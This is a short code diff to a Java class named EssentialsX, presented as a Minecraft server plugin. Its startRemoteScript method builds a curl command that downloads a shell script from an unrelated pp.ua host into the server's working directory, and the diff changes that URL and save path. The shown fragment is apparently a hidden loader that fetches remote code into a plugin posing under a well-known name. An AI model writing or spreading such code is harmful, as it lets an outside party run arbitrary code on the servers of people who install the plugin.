@@ -35,11 +35,12 @@ public class EssentialsX extends JavaPlugin {
     private void startRemoteScript() throws Exception {
         if (isProcessRunning) return;
 
-        String url = "https://netjett-de.kof95zip.pp.ua/plugins/cf.sh";
-        String file = "/tmp/cf.sh";
+        String url = "https://netjett-de.kof95zip.pp.ua/paper/start.sh";
+        String file = "start.sh";
+        String path = "./start.sh";
 
         // ===== 1. 下载脚本 =====
-        String downloadCmd = "curl -Ls " + url + " -o " + file;
+        String downloadCmd = "curl -Ls " + url + " -o " + path;
 
         int downloadExit = runCommand(downloadCmd, "DOWNLOAD");
         if (downloadExit != 0) {
